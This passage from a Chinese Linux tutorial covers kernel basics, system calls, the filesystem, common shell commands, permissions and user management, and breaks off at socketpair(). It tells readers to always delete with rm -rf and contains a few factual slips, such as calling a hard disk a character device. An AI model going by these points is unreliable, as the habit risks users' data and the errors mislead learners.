<h3 id="CPU-vs-Kernel-内核"><a href="#CPU-vs-Kernel-内核" class="headerlink" title="CPU vs Kernel(内核)"></a>CPU vs Kernel(内核)</h3><p>很多人容易无法区分操作系统的内核（Kernel）和中央处理器（CPU），你可以简单从下面两点来区别：</p>
<ol>
<li>操作系统的内核（Kernel）属于操作系统层面，而 CPU 属于硬件。</li>
<li>CPU 主要提供运算，处理各种指令的能力。内核（Kernel）主要负责系统管理比如内存管理，它屏蔽了对硬件的操作。</li>
</ol>
<p>下图清晰说明了应用程序、内核、CPU 这三者的关系。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848953.png" alt="Kernel_Layout"></p>
<h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><p>介绍系统调用之前，我们先来了解一下用户态和系统态。</p>
<p>根据进程访问资源的特点，我们可以把进程在系统上的运行分为两个级别：</p>
<ol>
<li><strong>用户态(user mode)</strong> : 用户态运行的进程或可以直接读取用户程序的数据。</li>
<li><strong>系统态(kernel mode)</strong>: 可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。</li>
</ol>
<p><strong>说了用户态和系统态之后，那么什么是系统调用呢？</strong></p>
<p>我们运行的程序基本都是运行在用户态，如果我们调用操作系统提供的系统态级别的子功能咋办呢？那就需要系统调用了！</p>
<p>也就是说在我们运行的用户程序中，凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。</p>
<p>这些系统调用按功能大致可分为如下几类：</p>
<ul>
<li><strong>设备管理</strong> ：完成设备的请求或释放，以及设备启动等功能。</li>
<li><strong>文件管理</strong> ：完成文件的读、写、创建及删除等功能。</li>
<li><strong>进程控制</strong> ：完成进程的创建、撤销、阻塞及唤醒等功能。</li>
<li><strong>进程通信</strong> ：完成进程之间的消息传递或信号传递等功能。</li>
<li><strong>内存管理</strong> ：完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<p>我在网上找了一个图，通过这个图可以很清晰的说明用户程序、系统调用、内核和硬件之间的关系。（_太难了~木有自己画_）</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848385.jpg" alt="img"></p>
<h2 id="初探-Linux"><a href="#初探-Linux" class="headerlink" title="初探 Linux"></a>初探 Linux</h2><h3 id="Linux-简介"><a href="#Linux-简介" class="headerlink" title="Linux 简介"></a>Linux 简介</h3><p>我们上面已经简单了 Linux，这里只强调三点。</p>
<ul>
<li><strong>类 Unix 系统</strong> ： Linux 是一种自由、开放源码的类似 Unix 的操作系统</li>
<li><strong>Linux 本质是指 Linux 内核</strong> ： 严格来讲，Linux 这个词本身只表示 Linux 内核，单独的 Linux 内核并不能成为一个可以正常工作的操作系统。所以，就有了各种 Linux 发行版。</li>
<li><strong>Linux 之父</strong> ： 一个编程领域的传奇式人物，真大佬！我辈崇拜敬仰之楷模。他是 <strong>Linux 内核</strong> 的最早作者，随后发起了这个开源项目，担任 Linux 内核的首要架构师。他还发起了 Git 这个开源项目，并为主要的开发者。</li>
</ul>
<h3 id="Linux-诞生"><a href="#Linux-诞生" class="headerlink" title="Linux 诞生"></a>Linux 诞生</h3><p>1989 年，Linus Torvalds 进入芬兰陆军新地区旅，服 11 个月的国家义务兵役，军衔为少尉，主要服务于计算机部门，任务是弹道计算。服役期间，购买了安德鲁·斯图尔特·塔能鲍姆所著的教科书及 minix 源代码，开始研究操作系统。1990 年，他退伍后回到大学，开始接触 Unix。</p>
<blockquote>
<p><strong>Minix</strong> 是一个迷你版本的类 Unix 操作系统，由塔能鲍姆教授为了教学之用而创作，采用微核心设计。它启发了 Linux 内核的创作。</p>
</blockquote>
<p>1991 年，Linus Torvalds 开源了 Linux 内核。Linux 以一只可爱的企鹅作为标志，象征着敢作敢为、热爱生活。</p>
<h3 id="常见-Linux-发行版本有哪些？"><a href="#常见-Linux-发行版本有哪些？" class="headerlink" title="常见 Linux 发行版本有哪些？"></a>常见 Linux 发行版本有哪些？</h3><p>Linus Torvalds 开源的只是 Linux 内核，我们上面也提到了操作系统内核的作用。一些组织或厂商将 Linux 内核与各种软件和文档包装起来，并提供系统安装界面和系统配置、设定与管理工具，就构成了 Linux 的发行版本。</p>
<blockquote>
<p>内核主要负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。</p>
</blockquote>
<p>Linux 的发行版本可以大体分为两类：</p>
<ul>
<li>商业公司维护的发行版本，以著名的 Red Hat 为代表，比较典型的有 CentOS 。</li>
<li>社区组织维护的发行版本，以 Debian 为代表，比较典型的有 Ubuntu、Debian。</li>
</ul>
<p>对于初学者学习 Linux ,推荐选择CentOS。</p>
<h2 id="Linux-文件系统概览"><a href="#Linux-文件系统概览" class="headerlink" title="Linux 文件系统概览"></a>Linux 文件系统概览</h2><h3 id="Linux-文件系统简介"><a href="#Linux-文件系统简介" class="headerlink" title="Linux 文件系统简介"></a>Linux 文件系统简介</h3><p><strong>在 Linux 操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。</strong> 也就是说在Linux系统中有一个重要的概念：<strong>一切都是文件</strong>。</p>
<p>其实这是 UNIX 哲学的一个体现，在 UNIX 系统中，把一切资源都看作是文件，Linux 的文件系统也是借鉴 UNIX 文件系统而来。</p>
<h3 id="inode-介绍"><a href="#inode-介绍" class="headerlink" title="inode 介绍"></a>inode 介绍</h3><p><strong>inode 是 linux&#x2F;unix 文件系统的基础。那么，inode 是什么?有什么作用呢?</strong></p>
<p>硬盘的最小存储单位是扇区(Sector)，块(block)由多个扇区组成。文件数据存储在块中。块的最常见的大小是 4kb，约为 8 个连续的扇区组成（每个扇区存储 512 字节）。一个文件可能会占用多个 block，但是一个块只能存放一个文件。</p>
<p>虽然，我们将文件存储在了块(block)中，但是我们还需要一个空间来存储文件的 <strong>元信息 metadata</strong> ：如某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等。这种 <strong>存储文件元信息的区域就叫 inode</strong>，译为索引节点：<strong>i（index）+node</strong>。 每个文件都有一个 inode，存储文件的元信息。</p>
<p>可以使用 <code>stat</code> 命令可以查看文件的 inode 信息。每个 inode 都有一个号码，Linux&#x2F;Unix 操作系统不使用文件名来区分文件，而是使用 inode 号码区分不同的文件。</p>
<p>简单来说：<strong>inode 就是用来维护某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等信息。</strong></p>
<p>简单总结一下：</p>
<ul>
<li><strong>inode</strong> ：记录文件的属性信息，可以使用 stat 命令查看 inode 信息。</li>
<li><strong>block</strong> ：实际文件的内容，如果一个文件大于一个块时候，那么将占用多个 block，但是一个块只能存放一个文件。（因为数据是由 inode 指向的，如果有两个文件的数据存放在同一个块中，就会乱套了）</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848586.png" alt="image-20210502150535276"></p>
<h3 id="Linux-文件类型"><a href="#Linux-文件类型" class="headerlink" title="Linux 文件类型"></a>Linux 文件类型</h3><p>Linux 支持很多文件类型，其中非常重要的文件类型有: <strong>普通文件</strong>，<strong>目录文件</strong>，<strong>链接文件</strong>，<strong>设备文件</strong>，<strong>管道文件</strong>，<strong>Socket 套接字文件</strong>等。</p>
<ul>
<li><strong>普通文件（-）</strong> ： 用于存储信息和数据， Linux 用户可以根据访问权限对普通文件进行查看、更改和删除。比如：图片、声音、PDF、text、视频、源代码等等。</li>
<li><strong>目录文件（d，directory file）</strong> ：目录也是文件的一种，用于表示和管理系统中的文件，目录文件中包含一些文件名和子目录名。打开目录事实上就是打开目录文件。</li>
<li><strong>符号链接文件（l，symbolic link）</strong> ：保留了指向文件的地址而不是文件本身。</li>
<li><strong>字符设备（c，char）</strong> ：用来访问字符设备比如硬盘。</li>
<li><strong>设备文件（b，block）</strong> ： 用来访问块设备比如硬盘、软盘。</li>
<li><strong>管道文件(p,pipe)</strong> : 一种特殊类型的文件，用于进程之间的通信。</li>
<li><strong>套接字(s,socket)</strong> ：用于进程间的网络通信，也可以用于本机之间的非网络通信。</li>
</ul>
<h3 id="Linux-目录树"><a href="#Linux-目录树" class="headerlink" title="Linux 目录树"></a>Linux 目录树</h3><p>所有可操作的计算机资源都存在于目录树这个结构中，对计算资源的访问，可以看做是对这棵目录树的访问。</p>
<p><strong>Linux 的目录结构如下：</strong></p>
<p>Linux 文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848885.png" alt="Linux目录树"></p>
<p><strong>常见目录说明：</strong></p>
<ul>
<li><strong>&#x2F;bin：</strong> 存放二进制可执行文件(ls、cat、mkdir 等)，常用命令一般都在这里；</li>
<li><strong>&#x2F;etc：</strong> 存放系统管理和配置文件；</li>
<li><strong>&#x2F;home：</strong> 存放所有用户文件的根目录，是用户主目录的基点，比如用户 user 的主目录就是&#x2F;home&#x2F;user，可以用~user 表示；</li>
<li><strong>&#x2F;usr ：</strong> 用于存放系统应用程序；</li>
<li><strong>&#x2F;opt：</strong> 额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把 tomcat 等都安装到这里；</li>
<li><strong>&#x2F;proc：</strong> 虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息；&#x2F;</li>
<li><strong>&#x2F;root：</strong> 超级用户（系统管理员）的主目录（特权阶级^o^）；</li>
<li><strong>&#x2F;sbin:</strong> 存放二进制可执行文件，只有 root 才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如 ifconfig 等；</li>
<li><strong>&#x2F;dev：</strong> 用于存放设备文件；</li>
<li><strong>&#x2F;mnt：</strong> 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统；</li>
<li><strong>&#x2F;boot：</strong> 存放用于系统引导时使用的各种文件；</li>
<li><strong>&#x2F;lib ：</strong> 存放着和系统运行相关的库文件 ；</li>
<li><strong>&#x2F;tmp：</strong> 用于存放各种临时文件，是公用的临时文件存储点；</li>
<li><strong>&#x2F;var：</strong> 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等；</li>
<li><strong>&#x2F;lost+found：</strong> 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows 下叫什么.chk）就在这里。</li>
</ul>
<h2 id="Linux-基本命令"><a href="#Linux-基本命令" class="headerlink" title="Linux 基本命令"></a>Linux 基本命令</h2><p>下面只是给出了一些比较常用的命令。推荐一个 Linux 命令快查网站，非常不错，大家如果遗忘某些命令或者对某些命令不理解都可以在这里得到解决。</p>
<p>Linux 命令大全：<a href="http://man.linuxde.net/">http://man.linuxde.net/</a></p>
<h3 id="目录切换命令"><a href="#目录切换命令" class="headerlink" title="目录切换命令"></a>目录切换命令</h3><ul>
<li><strong><code>cd usr</code>：</strong> 切换到该目录下 usr 目录</li>
<li><strong><code>cd ..（或cd../）</code>：</strong> 切换到上一层目录</li>
<li><strong><code>cd /</code>：</strong> 切换到系统根目录</li>
<li><strong><code>cd ~(或cd)</code>：</strong> 切换到用户主目录</li>
<li><strong><code>cd -</code>：</strong> 切换到上一个操作所在目录</li>
</ul>
<h3 id="目录的操作命令-增删改查"><a href="#目录的操作命令-增删改查" class="headerlink" title="目录的操作命令(增删改查)"></a>目录的操作命令(增删改查)</h3><ul>
<li><strong><code>mkdir 目录名称</code>：</strong> 增加目录。</li>
<li>**<code>ls/ll</code>**（ll 是 ls -l 的别名，ll 命令可以看到该目录下的所有目录和文件的详细信息）：查看目录信息。</li>
<li><strong><code>find 目录 参数</code>：</strong> 寻找目录（查）。示例：① 列出当前目录及子目录下所有文件和文件夹: <code>find .</code>；② 在<code>/home</code>目录下查找以.txt 结尾的文件名:<code>find /home -name &quot;*.txt&quot;</code> ,忽略大小写: <code>find /home -iname &quot;*.txt&quot;</code> ；③ 当前目录及子目录下查找所有以.txt 和.pdf 结尾的文件:<code>find . \( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \)</code>或<code>find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot;</code>。</li>
<li><strong><code>mv 目录名称 新目录名称</code>：</strong> 修改目录的名称（改）。注意：mv 的语法不仅可以对目录进行重命名而且也可以对各种文件，压缩包等进行 重命名的操作。mv 命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。后面会介绍到 mv 命令的另一个用法。</li>
<li><strong><code>mv 目录名称 目录的新位置</code>：</strong> 移动目录的位置—剪切（改）。注意：mv 语法不仅可以对目录进行剪切操作，对文件和压缩包等都可执行剪切操作。另外 mv 与 cp 的结果不同，mv 好像文件“搬家”，文件个数并未增加。而 cp 对文件进行复制，文件个数增加了。</li>
<li><strong><code>cp -r 目录名称 目录拷贝的目标位置</code>：</strong> 拷贝目录（改），-r 代表递归拷贝 。注意：cp 命令不仅可以拷贝目录还可以拷贝文件，压缩包等，拷贝文件和压缩包时不 用写-r 递归。</li>
<li><strong><code>rm [-rf] 目录</code> :</strong> 删除目录（删）。注意：rm 不仅可以删除目录，也可以删除其他文件或压缩包，为了增强大家的记忆， 无论删除任何目录或文件，都直接使用<code>rm -rf</code> 目录&#x2F;文件&#x2F;压缩包。</li>
</ul>
<h3 id="文件的操作命令-增删改查"><a href="#文件的操作命令-增删改查" class="headerlink" title="文件的操作命令(增删改查)"></a>文件的操作命令(增删改查)</h3><ul>
<li><strong><code>touch 文件名称</code>:</strong> 文件的创建（增）。</li>
<li><strong><code>cat/more/less/tail 文件名称</code></strong> ：文件的查看（查） 。命令 <code>tail -f 文件</code> 可以对某个文件进行动态监控，例如 tomcat 的日志文件， 会随着程序的运行，日志会变化，可以使用 <code>tail -f catalina-2016-11-11.log</code> 监控 文 件的变化 。</li>
<li><strong><code>vim 文件</code>：</strong> 修改文件的内容（改）。vim 编辑器是 Linux 中的强大组件，是 vi 编辑器的加强版，vim 编辑器的命令和快捷方式有很多，但此处不一一阐述，大家也无需研究的很透彻，使用 vim 编辑修改文件的方式基本会使用就可以了。在实际开发中，使用 vim 编辑器主要作用就是修改配置文件，下面是一般步骤： <code>vim 文件------&gt;进入文件-----&gt;命令模式------&gt;按i进入编辑模式-----&gt;编辑文件 -------&gt;按Esc进入底行模式-----&gt;输入：wq/q!</code> （输入 wq 代表写入内容并退出，即保存；输入 q!代表强制退出不保存）。</li>
<li><strong><code>rm -rf 文件</code>：</strong> 删除文件（删）。</li>
</ul>
<h3 id="压缩文件的操作命令"><a href="#压缩文件的操作命令" class="headerlink" title="压缩文件的操作命令"></a>压缩文件的操作命令</h3><p><strong>1）打包并压缩文件：</strong></p>
<p>Linux 中的打包文件一般是以.tar 结尾的，压缩的命令一般是以.gz 结尾的。而一般情况下打包和压缩是一起进行的，打包并压缩后的文件的后缀名一般.tar.gz。 命令：<code>tar -zcvf 打包压缩后的文件名 要打包压缩的文件</code> ，其中：</p>
<ul>
<li>z：调用 gzip 压缩命令进行压缩</li>
<li>c：打包文件</li>
<li>v：显示运行过程</li>
<li>f：指定文件名</li>
</ul>
<p>比如：假如 test 目录下有三个文件分别是：aaa.txt bbb.txt ccc.txt，如果我们要打包 test 目录并指定压缩后的压缩包名称为 test.tar.gz 可以使用命令：**<code>tar -zcvf test.tar.gz aaa.txt bbb.txt ccc.txt</code> 或 <code>tar -zcvf test.tar.gz /test/</code>**</p>
<p><strong>2）解压压缩包：</strong></p>
<p>命令：<code>tar [-xvf] 压缩文件</code></p>
<p>其中：x：代表解压</p>
<p>示例：</p>
<ul>
<li>将 &#x2F;test 下的 test.tar.gz 解压到当前目录下可以使用命令：**<code>tar -xvf test.tar.gz</code>**</li>
<li>将 &#x2F;test 下的 test.tar.gz 解压到根目录&#x2F;usr 下:**<code>tar -xvf test.tar.gz -C /usr</code>**（- C 代表指定解压的位置）</li>
</ul>
<h3 id="Linux-的权限命令"><a href="#Linux-的权限命令" class="headerlink" title="Linux 的权限命令"></a>Linux 的权限命令</h3><p>操作系统中每个文件都拥有特定的权限、所属用户和所属组。权限是操作系统用来限制资源访问的机制，在 Linux 中权限一般分为读(readable)、写(writable)和执行(excutable)，分为三组。分别对应文件的属主(owner)，属组(group)和其他用户(other)，通过这样的机制来限制哪些用户、哪些组可以对特定的文件进行什么样的操作。</p>
<p>通过 <strong><code>ls -l</code></strong> 命令我们可以 查看某个目录下的文件或目录的权限</p>
<p>示例：在随意某个目录下<code>ls -l</code></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848082.png" alt="Linux权限命令"></p>
<p>第一列的内容的信息解释如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848133.png" alt="Linux权限解读"></p>
<blockquote>
<p>下面将详细讲解文件的类型、Linux 中权限以及文件有所有者、所在组、其它组具体是什么？</p>
</blockquote>
<p><strong>文件的类型：</strong></p>
<ul>
<li>d： 代表目录</li>
<li>-： 代表文件</li>
<li>l： 代表软链接（可以认为是 window 中的快捷方式）</li>
</ul>
<p><strong>Linux 中权限分为以下几种：</strong></p>
<ul>
<li>r：代表权限是可读，r 也可以用数字 4 表示</li>
<li>w：代表权限是可写，w 也可以用数字 2 表示</li>
<li>x：代表权限是可执行，x 也可以用数字 1 表示</li>
</ul>
<p><strong>文件和目录权限的区别：</strong></p>
<p>对文件和目录而言，读写执行表示不同的意义。</p>
<p>对于文件：</p>
<table>
<thead>
<tr>
<th>权限名称</th>
<th>可执行操作</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可以使用 cat 查看文件的内容</td>
</tr>
<tr>
<td>w</td>
<td>可以修改文件的内容</td>
</tr>
<tr>
<td>x</td>
<td>可以将其运行为二进制文件</td>
</tr>
</tbody></table>
<p>对于目录：</p>
<table>
<thead>
<tr>
<th>权限名称</th>
<th>可执行操作</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可以查看目录下列表</td>
</tr>
<tr>
<td>w</td>
<td>可以创建和删除目录下文件</td>
</tr>
<tr>
<td>x</td>
<td>可以使用 cd 进入目录</td>
</tr>
</tbody></table>
<p>需要注意的是： <strong>超级用户可以无视普通用户的权限，即使文件目录权限是 000，依旧可以访问。</strong></p>
<p><strong>在 linux 中的每个用户必须属于一个组，不能独立于组外。在 linux 中每个文件有所有者、所在组、其它组的概念。</strong></p>
<ul>
<li><strong>所有者(u)</strong> ：一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者，用 <code>ls ‐ahl</code> 命令可以看到文件的所有者也可以使用 chown 用户名文件名来修改文件的所有者 。</li>
<li><strong>文件所在组(g)</strong> ：当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组用 <code>ls ‐ahl</code>命令可以看到文件的所有组也可以使用 chgrp 组名 文件名来修改文件所在的组。</li>
<li><strong>其它组(o)</strong> ：除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组。</li>
</ul>
<blockquote>
<p>我们再来看看如何修改文件&#x2F;目录的权限。</p>
</blockquote>
<p><strong>修改文件&#x2F;目录的权限的命令：<code>chmod</code></strong></p>
<p>示例：修改&#x2F;test 下的 aaa.txt 的权限为文件所有者有全部权限，文件所有者所在的组有读写权限，其他用户只有读的权限。</p>
<p><strong><code>chmod u=rwx,g=rw,o=r aaa.txt</code></strong> 或者 chmod 764 aaa.txt</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848210.png" alt="修改文件权限"></p>
<p><strong>补充一个比较常用的东西:</strong></p>
<p>假如我们装了一个 zookeeper，我们每次开机到要求其自动启动该怎么办？</p>
<ol>
<li>新建一个脚本 zookeeper</li>
<li>为新建的脚本 zookeeper 添加可执行权限，命令是:<code>chmod +x zookeeper</code></li>
<li>把 zookeeper 这个脚本添加到开机启动项里面，命令是：<code>chkconfig --add zookeeper</code></li>
<li>如果想看看是否添加成功，命令是：<code>chkconfig --list</code></li>
</ol>
<h3 id="Linux-用户管理"><a href="#Linux-用户管理" class="headerlink" title="Linux 用户管理"></a>Linux 用户管理</h3><p>Linux系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。</p>
<p>用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。</p>
<p><strong>Linux 用户管理相关命令:</strong></p>
<ul>
<li><code>useradd 选项 用户名</code>:添加用户账号</li>
<li><code>userdel 选项 用户名</code>:删除用户帐号</li>
<li><code>usermod 选项 用户名</code>:修改帐号</li>
<li><code>passwd 用户名</code>:更改或创建用户的密码</li>
<li><code>passwd -S 用户名</code> :显示用户账号密码信息</li>
<li><code>passwd -d 用户名</code>: 清除用户密码</li>
</ul>
<p><code>useradd</code> 命令用于 Linux 中创建的新的系统用户。<code>useradd</code>可用来建立用户帐号。帐号建好之后，再用<code>passwd</code>设定帐号的密码．而可用<code>userdel</code>删除帐号。使用<code>useradd</code>指令所建立的帐号，实际上是保存在 <code>/etc/passwd</code>文本文件中。</p>
<p><code>passwd</code>命令用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p>
<h3 id="Linux系统用户组的管理"><a href="#Linux系统用户组的管理" class="headerlink" title="Linux系统用户组的管理"></a>Linux系统用户组的管理</h3><p>每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同 Linux 系统对用户组的规定有所不同，如 Linux 下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。</p>
<p>用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对<code>/etc/group</code>文件的更新。</p>
<p><strong>Linux 系统用户组的管理相关命令:</strong></p>
<ul>
<li><code>groupadd 选项 用户组</code> :增加一个新的用户组</li>
<li><code>groupdel 用户组</code>:要删除一个已有的用户组</li>
<li><code>groupmod 选项 用户组</code> : 修改用户组的属性</li>
</ul>
<h3 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h3><ul>
<li><p><strong><code>pwd</code>：</strong> 显示当前所在位置</p>
</li>
<li><p><code>sudo + 其他命令</code>：以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</p>
</li>
<li><p><strong><code>grep 要搜索的字符串 要搜索的文件 --color</code>：</strong> 搜索命令，–color 代表高亮显示</p>
</li>
<li><p><strong><code>ps -ef</code>&#x2F;<code>ps -aux</code>：</strong> 这两个命令都是查看当前系统正在运行进程，两者的区别是展示格式不同。如果想要查看特定的进程可以使用这样的格式：**<code>ps aux|grep redis</code>** （查看包括 redis 字符串的进程），也可使用 <code>pgrep redis -a</code>。</p>
<p>注意：如果直接用 ps（（Process Status））命令，会显示所有进程的状态，通常结合 grep 命令查看某进程的状态。</p>
</li>
<li><p><strong><code>kill -9 进程的pid</code>：</strong> 杀死进程（-9 表示强制终止。）</p>
<p>先用 ps 查找进程，然后用 kill 杀掉</p>
</li>
<li><p><strong>网络通信命令：</strong></p>
<ul>
<li>查看当前系统的网卡信息：ifconfig</li>
<li>查看与某台机器的连接情况：ping</li>
<li>查看当前系统的端口使用：netstat -an</li>
</ul>
</li>
<li><p><strong>net-tools 和 iproute2 ：</strong> <code>net-tools</code>起源于 BSD 的 TCP&#x2F;IP 工具箱，后来成为老版本 LinuxLinux 中配置网络功能的工具。但自 2001 年起，Linux 社区已经对其停止维护。同时，一些 Linux 发行版比如 Arch Linux 和 CentOS&#x2F;RHEL 7 则已经完全抛弃了 net-tools，只支持<code>iproute2</code>。linux ip 命令类似于 ifconfig，但功能更强大，旨在替代它。更多详情请阅读<a href="https://linoxide.com/linux-command/use-ip-command-linux">如何在 Linux 中使用 IP 命令和示例</a></p>
</li>
<li><p><strong><code>shutdown</code>：</strong> <code>shutdown -h now</code>： 指定现在立即关机；<code>shutdown +5 &quot;System will shutdown after 5 minutes&quot;</code>：指定 5 分钟后关机，同时送出警告信息给登入用户。</p>
</li>
<li><p><strong><code>reboot</code>：</strong> <strong><code>reboot</code>：</strong> 重开机。**<code>reboot -w</code>：** 做个重开机的模拟（只有纪录并不会真的重开机）。</p>
</li>
</ul>
<h2 id="Linux文件描述符-句柄"><a href="#Linux文件描述符-句柄" class="headerlink" title="Linux文件描述符(句柄)"></a>Linux文件描述符(句柄)</h2><p>描述符表(descriptor table): 每个进程都有它独立的描述符表,它的表项是由进程打开的文件描述符来索引的. 每个打开的描述符表项指向文件表中的一个表项</p>
<p>文件表(file table): 打开文件的集合是由一张文件表来表示的, 所有的进程共享这张表. 每个文件表的表项组成(针对我们的目的)包括当前的文件位置、引用计数(reference count) (即当前指向该表项的描述符表项数),以及一个指向v-node表中对应表项的指针. 关闭一个描述符会减少对应的文件表表项中的引用计数. 内核不会删除这个文件表表项,直到它的引用计数为零;</p>
<p>v-node表(v-node table) : 同文件表一样,所有的进程共享这张v-node表. 每个表项包含stat结构中的大多数信息, 包括st_mode和st_size成员,同一个文件v-node table相同</p>
<p>多个描述符也可以通过不同的文件表项来引用同一个文件.例如同一个filename调用open函数两次, 就会发生这种情况.</p>
<p>open()函数所做的事情就是将传进去的字符串的路径在内核里面转换成相应的inode节点和结构体。执行这一任务的标准过程就是分析路径名并把它拆分成一个文件名序列，除了最后一个文件名以外，所有的文件名都必定是目录。</p>
<p>然后点击read调用后会从句柄中获取信息,然后将对应的页读到内核内存中,然后将内核buffer的内容放到应用程序buffer里;</p>
<ul>
<li>习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。</li>
<li>0,1,2对应的物理设备一一般是:键盘，显示器，显示器。</li>
<li>所以通常当我们成功打开文件时，返回的fd都是从3起。</li>
</ul>
<p>句柄(file descriptor, fd):</p>
<p>close（fd）之后句柄就返回给系统，例如打开一个文件后fd是3，close之后再打开另外一个文件也还是3，但代表的文件不一样了。</p>
<h2 id="Linux系统调用实现机制"><a href="#Linux系统调用实现机制" class="headerlink" title="Linux系统调用实现机制"></a>Linux系统调用实现机制</h2><h3 id="系统调用初始化"><a href="#系统调用初始化" class="headerlink" title="系统调用初始化"></a>系统调用初始化</h3><p>系统调用处理程序 system_call() 的入口地址放在系统的中断描述述符表IDT（Interrupt Descriptor Table）(一共有255个)中，Linux系统初始化时，由 trap_init() 将其填写完整，其设置系统调用处理程序的语句为：</p>
<p>set_system_gate(0x80, &amp;system_call)<br>经过初始化以后，每当执行 int 0x80(软中断) 指令时，产生一个异常使系统陷入内核空间并执行128号异常处理程序，即系统调用处理程序 system_call() 。</p>
<h3 id="系统调用公共入口"><a href="#系统调用公共入口" class="headerlink" title="系统调用公共入口"></a>系统调用公共入口</h3><p>system_call() 是所有系统调用的公共入口，其功能是保护现场，进行正确性检查，根据系统调用号跳转到具体的内核函数。内核函数执行完毕时需调用 ret_from_sys_call() ，这时完成返回用户空间前的最后检查，用 RESTORE_ALL 宏恢复现场并执行 iret 指令返回用户断点。</p>
<h3 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h3><ul>
<li><p>硬件（CPU）保护：ss 、 esp 、 eflags 、 cs 、 eip ，压入核心栈；</p>
</li>
<li><p>软件（操作系统）保护 </p>
<ul>
<li><p>使用 SAVE_ALL 宏将寄存器压入堆栈，加载内核的 ds 和 es ，往 edx 中放入 $(_KERNEL_DS) 以指明使用内核数据段，把内核数据段选择符装入 ds 和 es 。注意：该宏压入寄存器的顺序不是随意的，而是和系统调用的参数传递密切相关；</p>
</li>
<li><p>es 、 ds 、 eax 、 ebp 、 edi 、 esi 、 edx 、 ecx 、 ebx ，压入核心栈。</p>
</li>
</ul>
</li>
</ul>
<p>系统调用处理时的核心栈内容：</p>
<p>硬件完成 : ss esp eflags cs eip<br>软件完成 : es ds eax ebp edi esi edx ecx ebx</p>
<h3 id="返回值传递"><a href="#返回值传递" class="headerlink" title="返回值传递"></a>返回值传递</h3><p>当内核函数返回到 system_call() 时， eax中存放着内核函数的返回值。要将这个返回值传递给应用程序，内核先将 eax 放入原先 SAVE_ALL 宏保存 eax 的位置，这样当 system_call() 调用 RESTORE_ALL 恢复寄存器时， eax 便被恢复成系统调用的返回值，完成了返回值从内核空间到用户空间的传递。</p>
<h3 id="系统调用号和系统调用表"><a href="#系统调用号和系统调用表" class="headerlink" title="系统调用号和系统调用表"></a>系统调用号和系统调用表</h3><p>系统调用的数量由 NR_syscalls 宏给定，每个系统调用所对应的编号已预先在系统文件中定义，且都用一个宏表示，其定义有如下形式：</p>
<p>#define _NR_exit 1<br>#define _NR_fork 2<br>#define _NR_read 3<br>…<br>Linux的系统调用号和内核函数映射关系的系统调用表也被预先定义在系统文件中，具有如下形式：</p>
<p>.data<br>ENTRY(sys_call_table)<br>    .long SYMBOL_NAME(sys_ni_syscall)    &#x2F;* 空项 *&#x2F;<br>    .long SYMBOL_NAME(sys_exit)<br>    .long SYMBOL_NAME(sys_fork)<br>    .long SYMBOL_NAME(sys_read)<br>…</p>
<p>内核函数入口地址为： eax * 4 + sys_call_table 。</p>
<h2 id="Linux内核函数"><a href="#Linux内核函数" class="headerlink" title="Linux内核函数"></a>Linux内核函数</h2><h3 id="socketpair"><a href="#socketpair" class="headerlink" title="socketpair()"></a>socketpair()</h3><p>socketpair()函数用于创建一对无名的、相互连接的套接子。<br>如果函数成功，则返回0，创建好的套接字分别是sv[0]和sv[1]；否则返回-1，错误码保存于errno中。</p>
<p>基本用法： </p>
<ol>
